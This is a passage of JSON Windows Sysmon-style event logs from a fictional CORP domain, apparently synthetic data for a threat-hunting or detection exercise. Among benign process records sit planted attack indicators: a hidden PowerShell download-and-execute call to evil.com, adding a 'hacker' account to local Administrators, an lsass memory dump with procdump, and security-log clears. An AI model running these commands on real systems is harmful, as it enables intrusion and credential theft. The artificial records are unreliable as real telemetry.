  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "bob",
    "UtcTime": "2024-03-19T16:39:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "9286",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9dd46fde64bebf0006f75bb251df534b8ccaf9e80a877cbf49e18e3e3c5e8dd5"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "administrator",
    "UtcTime": "2024-03-01T08:09:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7536",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=311a740f9f52313dd293511791df8a123129d80abea479c689261162aca75128"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "dave",
    "UtcTime": "2024-03-29T11:15:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "1581",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=de4bc018f434cf55443df2200c15e9e7e7abeff48c47c54f61264b68fcff472b"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-08",
    "UtcTime": "2024-03-22T20:08:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.79",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.119",
      "SourcePort": "51298"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-03T14:02:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9889",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=46bd8998189b79509f1f2bdea618951481b3242c701d9fad43bf17b02427d407"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-25T03:29:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "8816",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=7899d36575b4da5cd773005296a32a7761d98e15d2b163491b6a4c07d73876e1"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-02T08:43:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1991",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=eeba5feb741d4878d4fc7cf948e381bf0ecfbbe6fcd7fd6bd49d1b4f8502067a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "bob",
    "UtcTime": "2024-03-27T13:35:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "3538",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d6fb305577c866305f46c7afd3db4ebfbd5c2dc0d92e3684fcf88a78d998fad3"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-27T00:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4713",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=947481e156f86683245273d5868aa7f3a17158c8869ab888eb58c00fcb041cfe"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-30T10:35:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "4420",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d5a1412f9be23a9ca94171f48833b1afe8c81498d96df41aa0569af35e07b319"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-19T17:09:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2217",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c983534323b4e4bdedcfb3301095bbb845aaae03451847d4bd5292d38fa08e1e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-27T10:55:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "1717",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3fdb46f9297987b4ec406686601e616e156b567da0948d21502b6cc69db4d7d9"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-01T12:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\net.exe",
      "CommandLine": "net localgroup Administrators hacker /add",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "8561",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=dc6a70206ecea92206a10aa5e382cb512b88f9fba10b7d0308a303cab6faae4e"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-04",
    "UserName": "charlie",
    "UtcTime": "2024-03-13T17:01:00Z",
    "EventData": {
      "SubjectUserName": "administrator",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "alice",
    "UtcTime": "2024-03-24T07:59:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "3668",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e8fece2812f6b85f289454e58179420c1a1f4033102c0b42350ce974c1c324b4"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-13T19:38:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "6397",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=276e57b1c1566e34fb6c1b26296c6ce3a75f9a47ad98e7320d69ab813b01eb52"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "administrator",
    "UtcTime": "2024-03-04T16:31:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "9227",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ed8308a4a7ea05da29739ddaca93f93a79202ef2baa53d76d97c43f536693ef7"
    }
  },
  {
    "EventID": 3,
    "Computer": "DC-01",
    "UtcTime": "2024-03-16T07:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.130",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.204",
      "SourcePort": "55992"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-23T07:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.208",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.191",
      "SourcePort": "55218"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "dave",
    "UtcTime": "2024-03-24T17:00:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "6258",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f48e8688ef437d7dc59331f1492d3c1c8f1ee029e4fa19010baf2265d1cb6690"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-29T20:19:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "8271",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c4eec60a5a24bb1533a46957441bb22506285d73d4332fbe6782fa637eb73b4e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T08:15:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -enc ZQBjAGgAbwAgAEgAZQBsAGwAbwAgAFcAbwByAGwAZAA=",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "4832",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=762590445a7483bac5dc2ef3b635aa0d2e39041bd086495c7a65e5cbfe987a97"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "charlie",
    "UtcTime": "2024-03-19T22:59:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "1469",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=2affe7d4f57f3548208d6c17718e0b99b28d1a9645795ef841801e835b83c8fb"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "administrator",
    "UtcTime": "2024-03-28T05:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4917",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1fafad2bdc2446952eb6e91c99472224f68534a585cdbb63c8c569a12847a977"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "bob",
    "UtcTime": "2024-03-06T19:39:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7626",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=db425ca8c9273effed5e1c08ccab31f3a6ea50d0a576144f7c9807ec78019756"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "administrator",
    "UtcTime": "2024-03-09T15:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "3376",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=56838335e06f7e1c203ce43dadec768f5a094253c14b644c6037a2fbcfb90aac"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "administrator",
    "UtcTime": "2024-03-17T06:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "2165",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a8caeb6630952b23dfc5969373d95dd34c2e4a28a10230f46e45525d693b3ef6"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-19T22:40:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.251",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.15",
      "SourcePort": "63975"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-01",
    "UtcTime": "2024-03-11T14:30:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.198",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.175",
      "SourcePort": "61275"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-16T01:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1009",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=84786744b03bfe37ffc80c40074213071d9133018bcb71c39ea6f9bb07fa640c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-14T10:39:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "6828",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=589a0d469d5864368d4e35b2af7ef749e3ed8664db3a4942c2083fffa38903db"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-08T08:13:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1594",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=285177b446cc5aae40720d98d31fe357241a251646f17c6f86f8437e6cf5878e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-28T21:59:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1167",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6ac3f41dd66743b94d25325bcade8bbf28ccdad08b29b6888bea8cf3468ca3cb"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "bob",
    "UtcTime": "2024-03-16T19:54:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "8451",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=703aa126b0cf280be090510a49e6ece8d6022a6efa605371e26c8e3a71376721"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-08T17:04:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9095",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b617921dd427f6d23b62bb38f20ed573a45e3e755e4985c8e3b36e6be96102dc"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "bob",
    "UtcTime": "2024-03-26T04:44:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "7579",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f1bfd2e9b8e991386b7bca6433de3e1c2bd4ea99e9b147e867dddd507c900d7d"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "charlie",
    "UtcTime": "2024-03-28T15:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "7335",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0f01d0daeb68a353740aa47da64eaa7484e0068ef477a6d66411e7581cda0878"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "alice",
    "UtcTime": "2024-03-27T06:52:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "3774",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=96ce96d09ad0ba84999e4893e987bcd4ffe7d1980f70502327874aae17f8cd2a"
    }
  },
  {
    "EventID": 1102,
    "Computer": "WORKSTATION-05",
    "UserName": "dave",
    "UtcTime": "2024-03-01T12:26:00Z",
    "EventData": {
      "SubjectUserName": "administrator",
      "SubjectDomainName": "CORP",
      "Channel": "Security"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "bob",
    "UtcTime": "2024-03-24T12:06:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "1007",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=8aa0a47a5132e7f9c20c884be795f9d710a4c49d647ac1a0f7674bab1b97b836"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "alice",
    "UtcTime": "2024-03-16T07:54:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "7253",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4d09d105f86470d59fe22caeac3ff2ca304376858c0651e94cb49b30410da2e4"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-05",
    "UtcTime": "2024-03-13T00:13:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.178",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.224",
      "SourcePort": "60005"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "bob",
    "UtcTime": "2024-03-08T19:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "7636",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=2d85804e18855b7b378c6e30f1912b759eb96b45034960c9f827a9836ffe904c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "dave",
    "UtcTime": "2024-03-03T07:58:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "1267",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=eb09a301fa9c60de84f3c491979642ff57475f1a7fd4da1d614d9ebe82b2b685"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-14T12:34:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "3857",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=621b5e802247a994cf977a6dba299a1663b2e6795652b3dec6ec32e2f9535b20"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-21T09:58:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4821",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4800cf66076b24bd982e3f47ac9c75c3c50915905281b73a54c7cdf73d974efc"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "administrator",
    "UtcTime": "2024-03-04T01:00:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "5531",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5691851f6a440442feb77460d1afb6e4d316585f23ed0b12a4fcbdd21163effe"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "administrator",
    "UtcTime": "2024-03-25T14:02:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1744",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=438b3e79a72d03e70154a8ff6f91a5b5ff3ec3eeef38c3f46502c29c0a98b016"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-01T10:28:00Z",
    "EventData": {
      "Image": "C:\\sysinternals\\procdump.exe",
      "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "8838",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=cbc9dc4e1463f8e9daaf0140bc10d7e2bc5be5ac4f6926ba0aa2cb7552a65f29"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-02",
    "UserName": "bob",
    "UtcTime": "2024-03-15T15:35:00Z",
    "EventData": {
      "SubjectUserName": "SYSTEM",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "bob",
    "UtcTime": "2024-03-29T15:35:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "8854",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=782131eac9d6aea311a5711b1f5cc2c66d8edc3dc0f9a01bb92e1a91f5243c3f"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "administrator",
    "UtcTime": "2024-03-25T08:45:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "5265",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=57dbec6002da6d242478644b7917b95aa4f6bcfe11cacb8631192935c7107cf7"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-03T21:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "6532",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a1186643c7e9f8bb4482f83467478da5acb98761c7192d1a4040ac9404d4e75f"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "dave",
    "UtcTime": "2024-03-03T19:40:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "3377",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=43fb871b5a84165190f832e137e731feb84a53cc0a57cb9d676040793bbf621e"
    }
  },
  {
    "EventID": 1102,
    "Computer": "WORKSTATION-03",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-01T12:46:00Z",
    "EventData": {
      "SubjectUserName": "administrator",
      "SubjectDomainName": "CORP",
      "Channel": "Security"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-05T13:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "1960",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=006450aab3b0229e610b1ce32466d90ec758aaccf06d45104fd8d8100ce7e0b1"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-05T05:21:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "3060",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=2e85a01ac4c28f0ebc4ef198c9f458037bf04e41e5aa82800622ddc32b11a5b6"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "alice",
